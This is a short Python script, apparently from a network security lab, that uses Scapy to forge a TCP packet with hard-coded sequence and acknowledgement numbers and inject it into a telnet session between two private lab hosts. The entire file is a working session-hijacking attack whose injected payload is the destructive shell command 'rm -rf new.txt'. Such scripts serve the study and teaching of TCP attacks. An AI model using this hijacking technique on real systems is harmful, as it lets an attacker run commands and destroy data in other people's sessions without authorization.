#!/usr/bin/env python3
from scapy.all import *
eth = Ether(src="02:42:0a:09:00:06", dst="02:42:0a:09:00:05")
ip  = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=59956, dport=23, flags="AP", seq=516336028, ack=2142703339)
data = "rm -rf new.txt\r"
pkt = eth/ip/tcp/data
ls(pkt)
send(pkt, verbose=0)